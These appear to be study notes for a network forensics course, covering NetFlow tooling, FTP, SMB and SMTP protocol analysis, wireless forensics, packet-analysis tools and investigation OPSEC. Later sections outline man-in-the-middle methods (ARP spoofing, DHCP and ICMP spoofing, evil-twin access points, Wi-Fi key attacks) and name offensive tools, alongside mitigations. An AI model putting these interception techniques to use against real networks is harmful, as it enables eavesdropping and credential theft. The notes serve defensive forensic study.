NetFlow storage options: Decided by Collector | Storage options: Database (e.g. plixer scrutinizer uses MySQL), Binary files, ASCII files
-	Open source tools like nfcapd/SiLK PS, etc. use binary & ASCII formats | SOF-ELK uses ElasticSearch

NetFlow limitations: TCP/80 -> HTTP? SSH? Raw Socket? What about AJAX? Data Exfiltration? Encrypted or not, traffic view in NetFlow is the same.

If TCP port 443 is active for long time, it is potentially 
a VPN connection (SSTP VPN uses TLS)
If TCP port 22 is active for long time by sending data, 
it is potentially SFTP or SCP

Open-source Flow Tools: 
nfcapd: Receives NetFlow data f/ Exporters (v5, V7, v9, IPFIX) | Saves data in binary | nfcapd.YYYYMMddhhmm
-	Files rotate every 5 minutes (288/exporter/day)
-	Date time stamp on file name is when the file is created / writing data started
-	General storage rule: Store 1MB of data for every 2GB of network traffic
-	-R flag allows forwarding of received NetFlow data to second system
$nfcapd -p 9227 -w -D -R 10.0.32/9227 -n router,10.0.1.1,/var/local/flow/router1

nfpcapd -> Will read pcap files and write out binary files in nfcapd format.
	$nfpcapd -r hugecapture.pcap -S 1 -z -l /cases/for572/netflow/

nfdump -> Reads binary i/p from nfcapd on cmd line / applies filters on netflow like tcpdump / output result in ASCII (raw, line, long, extended, custom) or binary (further nfdump processing) | Can apply BPF 
	$nfdump -r /var/netflow/2019/08/11/nfcapd.201908110635		//read from single file
	$nfdump -R /var/netflow/2019/08	//read recursively from a directory tree (usually date hashed)
   Filters: IP: host 1.2.3.4 or net 1.2.3.0/24 / Autonomous systems: as 31835 / Protocol: proto (tcp|udp|icmp|gre|ah|132) / Port: port 443 / TCP flags: flags S and not flags F or flags 0x02 / Session length (ms): duration < 5000 / Volume (bytes): bytes > 1000000
-	and/or/not	| 	src port, 	dst host,		dst net

Sample commands: Top 5 IP addresses ordered by number bytes and not in internal network
	# nfdump -R 2018/ -s srcip/bytes -n 5 'not src net 172.16.0.0/16'
	Top 5 IP addresses ordered by number of bytes and from internal network CIDR
	# nfdump -R 2018/ -s srcip/bytes -n 5 'src net 172.16.6.0/24 or src net 172.16.7.0/24'
	What protocols and ports were used for communicating with specific external IP address?
	# nfdump -R 2018/ -s port:p/bytes 'host 206.189.69.35'

-o (output ) : When not specified, nfdump displays data based on type of query used.
Else: -o line | -o long (+TCP flags + type of service) | -o extended
extended: packets per second (pps) | bits per second (bps) | Bytes per packet (Bpp)
-	These are not part of NetFlow v5 or v9. They are just statistically calculated.
nfdump supports IPv6. By default, the output is truncated. 
-	To have full IPv6 values displayed, use: line6, long6, extended6.
Custom output is possible from nfdump: -o “fmt:’<fields>’”	| Can also export as CSV and load into Maltego, DBs.

patient zero: the first host that connected to the suspicious C2 external IP on specified protocol and port. 
-a : by default, all 5 flow keys are considered: src/dst IP, protocol, src/dst port.
-A : srcpip,dstport (custom aggregation)	//netflow may report a single flow in multiple records, then this is req.

nfdump statistics: -s & -n

-s stat[:p][/order]

(top 10 records by default)
-n (top n records)

# File Transfer Protocol (FTP): 
Active FTP: Client connects to server port 21 with creds | servers says OK | Client sends PORT command with 6 numbers (first 4 are IP address and last 2 are used to compute the client listening port [(p5 * 256) + p6] = client listening port | Server says OK | Client sends LIST command | Server says OK and initiates connection from its source port 20 to calculated client listening port to send directory listing | Client sends PORT command with another 6 numbers | Server says OK | Client sends RETR <file> to server | Server says OK and initiates connection (from its port 20) to another calculated PORT on client to send actual file contents | Client issues QUIT command | Server says OK.

Passive-mode FTP: (Created to address the NAT & Firewall issues for FTP): Client connects to server port 21 with creds | Server says OK | Client sends PASV | Server sends 6 numbers (first 4 ips and last 2 used to calculate port) | Client sends LIST | Server sends OK | Client opens new connection from > 1024 port to new calculated server port | Server sends directory contents | Client sends PASV | Server sends Entering Passive Mode and 6 numbers | Client sends RETR <file> | Server sends OK | Client opens new connection from > 1024 to new calculated server port | Server sends file contents

Extended Passive FTP (EPSV): IPv6 added | NAT support | Uses fixed ports, not calculated | Most widely used
Client sends EPSV | Server sends Entering Extended Passive Mode (|||<port>|) | Client sends RETR <file> | Server sends OK | Client initiates new connection from > 1024 port to server specified port |  Server sends file conents

-	Extended PORT (EPRT) is also possible with IPv6 support added and same as PORT command in active
-	Server’s data response doesn’t contain any headers or footers or other metadata.

NetworkMiner tool can automate the forensics part of this FTP protocol analysis on a packet capture. First step is to review ‘command channel’

# Microsoft Protocols: 
SMB: No RFC for this, it is proprietary protocol | Used for remote access to files, group policy, remote execution, PSEXEC (remote inter-process communication) (IPC) protocol
Main protocols to focus: AD authentication (Kerberos / NTLM), SMB, Outlook to Exchange synchronization, External clients (VPN), SharePoint
-	Not covering: DNS, NTP, FTP, DHCP, TFTP

Example unusual detections by Forensicator: In a Windows-Domain based client/server architecture, a system in a WORKGROUP. 
        
Outlook to Exchange: Uses RPC in domain configuration | Every field is XOR with ‘0xA5’ (although some fields are human readable) | SMTP servers require authn: Secure Password Authentication (SPA), NTLM-based or other.

CIFS was old protocol, renamed to SMB later
Old SMB was used on NetBIOS over IPX (NBIPX) and later NetBIOS over TCP (137,138,139)
Current OSes support SMB 2.0 and SMB 3.x on TCP port 445 (without NetBIOS) / may still use legacy port for backward compatibility

With Win 10 and Server 2016, SMB1 has been removed by default, due to WannaCry.

SMB3: This version introduced encryption (AES-CCM, Counter with CBC-MAC) into SMB. Everyone has to be on SMB3 for this to work.  Signing using AES-CMAC (Cipher-based MAC) 
-	Secure Dialect Negotiation (SDN) prevents downgrade of SMB3 to SMB1
Forensicator goals for SMB | Don’t over-rate the attacker (APT) | Display filter in tshark: ‘smb or smb2’
-	GPO replication traffic can be filtered using: ‘gpt.ini’ and sysvol files
-	Filter by ports: 137,138,139,445
-	Filter with ‘smb or smb2’ will NOT capture remote registry access, SAMR, LSARPC, DCE/RPC, etc.
smb2 and smb3 have 19 commands to capture (smb1 has over 100 commands) => look into book for them.

SMB is one TCP connection for entire duration.
SMB2/3 protocol: First command is ‘NEGOTIATE_SSESSION’. We can filter this using: “smb.cmd == 0x72” (negotiate protocol) or “smb2.cmd == 0” 
-	Security Blob: ASN.1 encoded (challenge-response authn protocol)

SESSION_SETUP (establishment): Domain, Host, User | “smb2.cmd == 1” | Server sends session ID (smb2.sesid),       8-byte value, after user authn (challenge / response) | Password is NOT sent in clear / sent according to dialect agreed during negotiation / GSS-API / SPNEGO (Simple Protected Negotiation) (Encryption is NOT required) | Session IDs are NOT logged anywhere.

TREE_CONNECT (Access Services): Display filter: “smb2.cmd == 3” | Server assigns Tree ID for client’s requested object (smb2.tid), used for all subsequent access requests | Tree ID is ephemeral / not logged anywhere.

CREATE (Directory navigation): Creating handler to access the directory | “smb2.cmd == 5” | e.g. \Windows\, this is relative to earlier Tree: \\IP\C$ | Server create 16-byte GUID / File ID value in response | MACB times

QUERY_DIRECTORY (Obtain directory listing): “smb2.cmd == 14” | Includes search pattern inside the parent directory (referenced by GUID file ID) | Server also provides metadata related to folders and files in the parent directory (e.g. last change date, etc.). | MACB (Modified <contents>, Last Access, Change <file name>, Born <creation>) times | EoF size (byte count) | Allocation size (number of bytes on clusters on which file resides)

CREATE (Open a File): “smb2.cmd == 5” | smb2.filename | Server assigns GUID File ID (smb2.fid), ephemeral | Request to create a file handle to access the file | Response includes bit mask: SMB2_CREATE_QUERY_MAXIMAL_ACCESS_REQUEST (list of permissions for authnd user for resource) | 6 different types of disposition field values in request

READ/WRITE (Read from a file or write to a file): “smb2.cmd == 8” | Partial file reads with byte offsets & length | Cannot “follow TCP stream” to get original file (but can provide leads, e.g. can notice file access), UTF-16 encoding (NULL bytes \x00, represented with “ . “) and binary | Request has GUID File ID | Server responds with plaintext ‘Data:’ with offset indicators | Wireshark and Zeek can be use to reconstruct a file | Multiple READ commands are sent by client, to obtain large files based on offset indicators

CLOSE: smb2.cmd == 6 | De-assigns GUID File ID
TREE_DISCONNECT: smb2.cmd == 4 | De-assigns TREE ID | Un-map the drive
LOGOFF: smb2.cmd == 2 | De-assigns SESSION ID (after all trees are disconnected) | Can remain open long, unless forced policy exists at domain level

Indicator of Compromise (IoC) for SMB: client-to-client file share over SMB | client-to-server access at unusual hours | File share access by same account from different PC/country/LANs, etc. | Large copy actions | Too fast movement from one network to another

Automatic extraction: We can use tshark's --export-objects feature to extract SMB objects    OR
Use Zeek tool: #zeek <policy> -r <pcap_file>		//files.log contains the list of files extracted

# BOOK-4: Commercial Tools, Wireless & Full-Packet hunting 

SMTP: Simple Mail Transfer Protocol: 1982 | RFC 821 | Sending & Relay protocol | Hops between sender and receiver have roles:
-	Mail User-Agents (MUA): Client software used to send email (via SMTP) (Outlook, Mail.app, etc.)
-	Mail Submission Agent (MSA): Server software that first received the message from Client software and submits to overall SMTP process
-	Mail Transfer Agent (MTA): Server software that passes along to other MTAs | Both SMTP server & client 
-	Mail Exchanger (MX): Responsible receiver of mail sent to a given hostname (from DNS record) | Each DNS record can have multiple host names for redundancy or load balancing | Last-step MTA
-	Mail Delivery Agent (MDA): Server software that provides emails to user after successful authentication | Uses POP3, or IMAP, or MAPI. Receives MUA connects to MDA for retrieval of emails.

At each stage, message header with server, date, time and path of routing are added.  (Received: header)
https://toolbox.googleapps.com/apps/messageheader/analyzeheader (G Suite Message Header Analyzer)
Webmail clients use HTTPS | Desktop mail apps use SMTP | MS Outlook uses RPC (inside HTTPS)
Besides TCP port 25, SMTP uses Port: 587 (requires authentication) | TCP/465 was also used for a while for TLS/SSL
Native-TLS deprecated in favor of STARTTLS (also provides encryption), AUTH using CRAM-MD5

Basic SMTP Transaction: SMTP Headers (MIME type and Boundary string) | Mail message headers (ends w/ empty line separator, aka Double-CRLF. In Hex, it is 0x0D0A0D0A) | Mail message body (HTML content, and ends with “dot”) | Teardown
Server performs reverse-DNS lookup based on initial client’s EHLO command and host name to confirm the IP and hostname as matching. Else it is a SPAM.
-	Arbirtary X-* headers are added by MX server to the MDA.

Email Attachments: MIME/base64 encoding
-	Content-Type: multipart/mixed; boundary=<GUID>
SPAM: Authentication (AMTP-AUTH / RFC4954 / LOGIN & PLAIN / base64 (user & pass) / OAUTH (modern)
-	AUTH LOGIN: 334 base64(username) | 334 base64(password) | 535 authentication failed
-	AUTH PLAIN: AUTHN BLOB = base64(identity+username+password)  | 235 OK
-	AUTH OAUTHBEARER: base64(token) / no password sent
Privacy data: Encryption
-	Native TLS: Establish TLS before SMTP 
-	STARTTLS: “Go Secure” on plaintext connection (CRAM-MD5)
International character sets: Unicdeo

Why SMTP for Forensics: Identify data theft via email (keyloggers, etc.), Network based monitoring of spear phishing, etc.

Automated object extraction with Network Miner: Commercial & free version | Can passively sniff interface or read from PCAP files | Run on system without AntiVirus, Anti-Malware, etc.
Must review:
-	Legal requirements | Support structure | Development roadmap | Deployment scalability | Cost/Benefit (direct & indirect)
Can extract: Files, Images, 	Mail messages, Credentials, etc. => All to the disk.
 
Windows-native tool | But can run on Linux and MacOS using cross-platform .NET framework called: Mono.
“Hosts” tab has IP addresses but can also provide ‘OS information’ for IPs. This profiling is done by libraries such as Ethercap, p0f, satori (passive OS fingerprinting tool), along with likelihood of its answer as a percentage. 

Has slow processing speed for analyzing large packet capture files. Better to reduce PCAP sizes before loading into NetworkMiner tool. 	| Profiling hosts based on JA3 hash.
CapLoader: (Netresec company): Not a security tool by itself | Reads, indexes large PCAP files (GB of data) | Host/service discovery | Export flows to NetworkMiner / Wireshark | 30-day limited trial

Wireless Network Forensics: 
Switched Network: Sniffing is active | Wireless Network: Sniffing is passive | Attractive to attacker. In Wireless:
-	BSSID: Wi-Fi Router’s MAC address (Base Station Identifier) / One per Access Point (AP)
-	BSS: Basic Service Set: Physical footprint around the AP (circle / sphere)
-	DS: Distribution System (wired side of architecture) | Router, for example
-	ESS: Extended Service Set: Collection of AP with same SSID (Hotels, Home, Company, etc. use this)
Primary challenge: restricting where a device can access the network
Master mode or Infrastructure Architecture mode: Base stations with SSID
Managed mode: Devices that connect to Access Point (AP) | Default operating mode of Laptops
Ad-Hoc or Peer-to-peer mode or Independent Basic Service Set (IBSS) Networks: Tethering (Phone is in master mode) | Hotspots | wireless printers | Apple’s AirDop file exchange
Monitor or RFMON mode: No transmission but listens on all 802.11 traffic on a set frequency | RFMON is passive | Cannot be electronically detected by others in the vicinity | Can listen only one channel/frequency at a time (unless hope thru multiple interfaces)
Tools: OS + Wireless card (to put in monitor mode) | Linux can easily put in Monitor mode than Windows | Riverbed AirPcap USB wireless card comes with Windows drives | This can do promiscuous mode for 802.11 traffic | Alfa / Realtek devices are popular

Software tools for WiFi: Wireshark | Kismet (passive wireless monitoring, GPS i/p for mapping, allows to conduct surveys) | NetSpot (can locate Rogue AP and dead spots / maps wireless coverage and available n/w) | Aircrack-NG (Audit WEP and WPA impl. / code from coWPAtty) | tcpdump (can enter monitor mode based on h/w) | inSSIDer (Win: v5 & MAC: v4) (Metageek company / works with built-in network card or buy Wi-Spy (frequency analyzer) tool / Channalyzer / Eye P.A.
-	MAC OS has built-in monitor mode capability and accessible diagnostics / handy sniffer (airport tool)
$airport <device> sniff <channel>	(e.g. $sudo ./airport sn0 sniff 6)
	(WiFi icon changes to “Eye of Sauron” on MAC) / output is written to pcap only at exit of cmd in /tmp
		(hold on OPTIONS key on WiFi of MAC to know technical details like channel)
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/Airport

Wireless Controller: For centrally managing Wi-Fi infrastructure configuration | UniFi product from Ubiquiti company | Free
Benefits of controller to forensicator: Detect Rogue AP | Neighboring AP | Client inventory & behavior profiling | Signal strength logging per AP & client | Channel changes due to congestion or interference | Client movement based on AP association 
-	Controllers can send log events via syslog 

802.11: Layer-2 framing protocol / Replaces Ethernet header / Majority of control info is in first section: “Frame Control”. 

Frame type: 0 (mgmt. frame, only in monitor mode, control BSS (service coverage area), ) | 1 (control frame, only in monitor mode, for managing RF, transmitted regardless of BSSID) | 2 (data frame, headers shown only in monitor mode, actual data from host A to host B)
-	Management (and control) frames are Plaintext exchanges
-	SSID is transmitted typically 10 to 20 times a second

Management-frame subtypes:     3 control-frame subtypes: 

In ethernet world: CSMA/CD (Collision Detection) | In wireless world: CSMA/CA (Collision Avoidance)

Data-frames: Payload exists | If no data (0x24, null function) | 0x0800 (Logical Link Control type, IP) | Only frame that can be encrypted, indicated by single security bit | Enc algo (WEP, WPA, WPA2, etc. doesn’t matter) | Tagged params decide level of encryption (old tools assume all data frames encrypted with WEP)

ToDS & FromDS flags set the direction of frame (wired to wireless and vice-versa) | Same MAC address can be in multiple address fields in 802.11 header (AP to Host: 2nd & 3rd positions are same | Host to AP: 1st and 3rd positions are same)
-	Destination is Broadcast –> all ff:ff:ff…  (this is not encrypted)
-	ARP requests are 62 bytes in size
-	PMK (PairWise Master Key) and 4-way handshake can help derive session key for performing decryption
Sniffing with RFMON (Monitor mode) | Session key can be derived with: PC’s (MAC & Nonce) + AP’s (MAC & Nonce )+ Wi-Fi SSID
Forensicator will struggle to identify attacker injected packets and frames | Need Wireless IDS for enterprise level detection (any Wireless IDS need to be in monitor mode (RFMON), so some legal issues around it)
Wi-Fi attacks: 
1)	WPA/WPA2 (RSN, Robust Security Network): offline (PSK dictionary attack) | online (Forged de-authentication, RTS (Request to send)/CTS (clear to send) attacks, KRACK forced key reuse) | Wireshark uses RSN designation in parsing functions for WPA2
2)	DoS: online (RF [kill signal to noise ratio] or protocol attacks)
-	Jamming (SPEC5 device) 2.4 GHz & 5 GHz | Violation of law to use this | Unintentional overload possible
-	A channel change on AP is logged | when this happens frequently, DoS is probably underway
3)	Evil Twin: online (Spoofed access point)
-	Social Engineering Toolkit (SET) can setup Evil Twin | Wi-Fi pineapple router (can spoof SSID)

Monitor mode: To detect APs and Stations | Master mode: To pretend to be AP | Managed mode: When we have stolen credentials.

Automated tools and libraries: 

Popular libraries: libpcap / npcap (API for capture and display of network traffic) | libnids (IP defrag, TCP stream reassembly, TCP port scan detect, etc.)
-	Have wrappers in C/C++, Python, Perl, Java

[Traffic filtering and manipulation: slice and dice network traffic]
tcpflow: $tcpflow -r ftp.pcap	//writes out data files that are RPM binaries (srcip.port-dstip.port)
-	Has knowledge of TCP sequence numbers of connections, allows reconstruction of data streams (e.g. web pages downloaded can be re-created using “-e http” flag) | libpcap based | BPF filter
-	“-e netviz” provides overview of source data in a PDF file 

scapy: python framework | parse, decode, create (& forge) packets / can build custom sniffer or pcap reader / can examine undocumented protocols

Dshell: open-source f/ Army Research Lab | Python | TCP stream assembly (IPv4 and v6) | GeoIP integration for geo and ASN | plugins to extend parsing | Netflow-like data
	$dshell
	Dshell> decode -d netflow ftp-example.pcap
	Dshell> decode -d dns nitroba.pcap

editcap: extracts timeframe from pcap files | de-duplicates packets | Part of Wireshark suite of utilities
	$editcap ftp.pcap /tmp/ftp-0200-0300.pcap -A ‘2008-07-22 02:00:00’ -B ‘2008-07-22 03:00:00’

[Traffic searching: based on unique strings, or byte sequence, etc. to look for interesting traffic]
ngrep: search for strings or regex | write matching packets to disk | suitable for plaintext protocol |can read from live network interface or from a pcap
	$ngrep -q -I ftp-example.pcap -W single ‘RETR’ ‘port 21’

[Statistical analysis: qualitative metrics associated with traffic / anomalies detection as well]
tcpstat: 15 observed (src/dst ip/port) and calculated (packet count/average size/bandwidth) traffic statistics | like vmstat for network | A similar one: tcpdstat has more output options | read from pcap or from live interface | can plot using gnuplot
	$tcpstat -r ftp-example.pcap -o “%R\t%A\n” 1 > arp.data
$tshark -n -q -r evidence1.pcap -z "http,stat"    //Count of HTTP Status Codes & Request methods
	$tshark -n -q -r evidence1.pcap -z io,phs  	       //list of protocols in the capture file
[Network forensics & Analysis: extract additional info from app layer, etc. beyond just metadata]
ntopng: More for live network captures than reading a pcap | Web-based view of network capture in live | Provides stats on traffic (top talkers (ip/ports/protocols), traffic account/byte counts, thruput, etc.) | Real-time usage information of network | Can also receive NetFlow data and perform targeted full capture per host | can provide application name based on TLS certificate subject DN

tcpxtract: Command line to extract files from traffic (based on file header & footer) by use of config file | Unsuitable for chuncked-encoded HTTP, SMB, etc. | Live packet capture or read from pcap | No file name, so puts frame number as file name (with extension as in config file) http://foremost.sourceforge.net/ 
	$tcpxtract -c myconfig.conf -f ftp-example.pcap -o /tmp/
Full packet hunting with Moloch: Supports both network forensics and continuous monitoring | full packet capture | protocol parsing / indexing | pcap reduction | open-source, started at AOL | database system | web interface (browse, search, export)
Platform components: Capture (live or existing, creates SPI data) | Elasticsearch (store, index, search SPI) | Viewer (web-GUI)  	|    SPI: Session Profile Information
-	Can operate as ‘fleet’ model for large-scale use cases | Has free slackware for chatting best practices

Limitations of Moloch: Although we can write our own, Moloch as less protocol support than Wireshark | Tuning needs for capture higher speed networks | DB tuning and administration | No support for bugs or performance issues

Reading existing pcap files with Moloch:
$moloch-capture -q -r single.pcap --copy -t tag1 -t tag2	//single pcap file
$moloch-capture -q -R /path/to/pcaps --recursive --copy	//pcaps directory (recursive), must end with .pcap extension

--copy will copy pcaps to /data/moloch/raw/ folder by default 
 
Filtering in Moloch: &&,   ||,    !=,    ==,  EXISTS!, (),  >,  <
EXISTS! => query for records where specific field is identified & indexed (e.g. “cert.issuer.cn == EXISTS!”)

Tokens: Moloch searches by tokens (“www.sans.org” is tokenized into “www”, “sans”, “org” for searches)
Lists: “http.uri == [www, moloch]”
Wildcards: “*” => “http.uri == “www.sans.*” ” (all characters)   and    “http.uri == “www.sans.?” ” (single character)
Regular Expression: must be enclosed in forward slashes ( / ) | Uses underlying Elasticsearch regex engine

e.g. “host.dns == *google*” | http.method == POST && host.http == *homedepot.com | tls.cipher == EXISTS! && tls.cipher != *DHE*

Moloch has “community id”, just like zeek | Red and blue colors on requests and responses like in Wireshark

“Hunt” features allow raw packet search in ‘Session’ tab | Hunt will be queued in background, if filtering is used.
-	Gives ‘huntid, when a match is found for the search done’ and ‘huntName’
-	Remains searchable with these even if source pcap file is deleted
 
Data enrichments in Moloch: GeoIP and Autonomous System (MaxMind GeoIP database files)| TLS parser with JA3/JA3S/HASSH fingerprint hash (Native) was added recently to identify TLS client software libraries based on TLS negotiation preferences.
-	Search with externally (free or commercial) located code can also be used for searching in private DBs / without sending any private info 

API-based platform: WISE (With Intelligence See Everything): Go to external datasources and pull up information
e.g. MD5 hash can be sent to virustotal and look for score | Add this info to local DB (elasticsearch) and use later
Moloch has integrated CyberChef tool.

# BOOK-5: Encryption, Protocol Reversing, OPSEC, Intel
Encoding: translate into more suitable one for transport/storage
-	Text encoding: ASCII, UTF-7, UTF-8, UTF-16
-	Binary encoding: Base64/MIME (translate unprintable to printable)
-	Compression: MPEG2, MPEG4, MP3, H.264

Base64: A-Z a-z 0-9 + (/ or -) 		“==” padding at the is optional 

A subset of encoding algorithms is used for encryption | Encryption is a subset of Encoding
Restricted algorithms: Custom algo that are known only to sender and receiver. 
Symmetric Key Encryption: 100% depends on key security | Stream and Block cipher | Computationally cheap
-	Stream cipher: key=seed, at start| Ideal for variable length | self-sync mode adds randomness | slow than block | RC4, German Enigma, WEP| less vuln to cryptanalysis attack (each portion of message is enc with different portion of key) | One transmission error breaks entire decryption
o	Keystream is generated in two ways: synchronous ciphertext (independently of message) & self-synchronous ciphertext (generated from previous N number of bits)
-	Block cipher: Identical blocks produce same result | 
Asymmetric Cipher / PKI: TLS/SSL, S/MIME, PGP/GPG

PFS: Diffie-Hellman key exchange provides PFS | Generating random ephemeral encryption session key without relying on any deterministic algorithm
DHKE: g^a mod p 	and	 g^b mod a

SSL/TLS: client hello (has lot of artifacts) -> server hello (has less artifacts than client hello)
Client profile can be generated using: Requested SSL/TLS version + cipher suites + SSL/TLS extensions
-	JA3 hash combines these into easy-to-use value (e.g. user agent string of attacker): Generates MD5 hash
$ja3.py -j tls_dfir.com_session.pcap | jq -cr ‘.[]’
-	Then grep for the has in ja3fingerprint_us.json file to get the human readable user-agent string
$grep <hash> /usr/for572/ja3fingerprint_ua.json | jq -cr ‘.useragent’

Server profile: can be generated using: Chosen SSL/TLS version + cipher suite + extensions
-	JA3S hash combines these into easy-to-use value / generates MD5 hash
$ja3s.py -j tls_dfir_session.pcap | jq -c ‘.[]’
-	Fewer known signatures but growing in popularity

TLS certificates: If serial number is small, most likely it is self-signed certificate. 90-day certificate window suggests that it is issued by Lets Encrypt. However, ‘Issuer’ field on cert is the authoritative source of cert issuer.

SNI: Server Name Indication is a field in TLS Client Hello message to tell server which host/authority it wants to connect to. Server can then send the TLS certificate according to the host/authority info sent.
-	TLS 1.3 has capability to encrypt this SNI field

TLS SAN: Subject Alternative Name: List of subject CNs that browser can validate the certificate against.
-	Domain parking providers and CDNs use this field a lot

Extract TLS certificates from PCAPs: 
$tshark -V -n -r tls_dfir.com_session.pcap -Y ‘tls.handshake.certificates’| grep Certificate:
However, NetworkMiner automatically extracts the TLS certificates

Meddler-in-the-Middle:  Interception of traffic: Allows for decryption, filtering, manipulation, etc.
ARP spoofing: Flooding LAN with spoofed ARP replies so attacker’s MAC is address is associated with target’s IP
-	Mitigations: Layer-2 DHCP Snooping + Dynamic ARP inspection | Static ARP entries | OS-specific config

Port Stealing: Wired env | Attacker manipulating traffic on switch that is destined to a victim system | Sending high-amount of fake ethernet frames with Victim’s MAC address | Switch’ internal CAM table (contains MAC addresses cache) gets updated
-	Mitigations: port security | enterprise grade switch

UDP first response wins: DNS, DHCP, etc.  Mitigation: Application layer validation

STP Mangling: Attacker manipulates spanning tree protocol config of a n/w device on switched network to obtain data
DHCP spoofing: Broadcasts | attacker responds faster than real response, can manipulate IP, gateway, DNS, etc.
ICMP Redirect: Attacker forges an ICMP redirect packet to attacker’s PC
IRDP Spoofing: Attacker forging advertisement packet pretending to be a router on LAN. Attacker sends preference level and lifetime to ensure attacker’s PC is the preferred router.

MITM Tools: Bettercap (ARP poisoning, dynamic host discovery, etc. Extendable with Ruby code, transparent proxy, credentials collector, URL acquisition, HTTPS hostname) & dsniff (designed for pen testing & auditing, looks for emails, passwords, files, etc., Inbuilt arpspoof, dnsspoof, maccof, etc., can exploit weak key bindings with SSL/TLS, and SSH connections) 
Yersinia: Linux/Unix only | named after bacteria | open-source | MITM against large number of layer-2 protocols:
-	Spanning tree protocol | Cisco Discovery Protocol | DHCP | Hot Standby Router Protocol (HSRP) | Dynamic Trunking Protocol | 802.1Q | 802.2X | VLAN Trunking Protocol

MITM for Network Defense: DLP, IDS, Forward proxies

Network Protocol Reverse Engineering: Extract structure, attributes, data from network protocol implementations
-	Structure (layout of control signal, metadata, payload data), flow (timing, order, size, directionality), encapsulation (carrier protocol, ICMP, UDP, TCP, SSL/TLS, HTTP, etc.), functionality (set of commands run by attacker), encoding/encryption routines (evading IDS by attackers, transformation), etc.
Two goals: Identify network-based additional malicious activity / Develop protocol decoders to identify or explain attacker activity

Need client binary/source OR server binary/source OR network traffic capture

Gh0st RAT: Remote Administration Tool: source code released by unknown parties | politically funded | Implements binary C&C protocol (compressed using ZLIB) | backdoor | used by Gh0stNet | To compromise embassies and office of Dalai Lama. 

HTTP:- Protocol that contains C&C communication / attacker’s mostly use this !
DNS:- Protocol that resolves attacker’s C&C domains, once internal host is compromised
ARP:- Protocol that is internal to LAN, least likely to be used by attacker for data exfil or other malicious activities

Investigation OPSEC and Threat Intel: 
-	Real time DNS lookups must be avoided | alerts the attackers
-	No OSINT research | don’t upload binary/malware to virustotal | Attacker is watching us | Don’t use social media sites while investigating (cookies are tracked) | 
-	The attacked environment is under surveillance  “Moscow Rules”
-	Premature traffic block causes significant OPSEC risk | attackers have grown smart
-	DHCP and DNS are non-interactive | System automatically sends DHCPDISCOVER or DHCPREQUEST at beginning | 
Multicast DNS: zero-configuration networking / Universal plug & play / Bonjour / UDP port 5353 / noisy / peer-discovery of IoT or IoT-like devices
-	Ignore the automatic updates done by software, anonymous usage data | etc.
o	To prevent leakage: “Little Snitch on MAC” | GlassWire on Windows | OpenSnitch for Linux
-	Perform research of adversary related information outside the victim’s network
-	Use separate network for investigation e.g. hotspot, standing connection to internet not part of company
-	Don’t use forensic PCs to perform internet search

ISACs (Information Sharing & Analysis Center) & ISAOs (ISA Organizations) | Sharing information responsibly
TLP: Traffic Light Protocol: RED (most restrictive, data cannot be lost by any means) | AMBER (shared inside organization) | GREEN (Community-wide distribution) | WHITE (Unlimited)
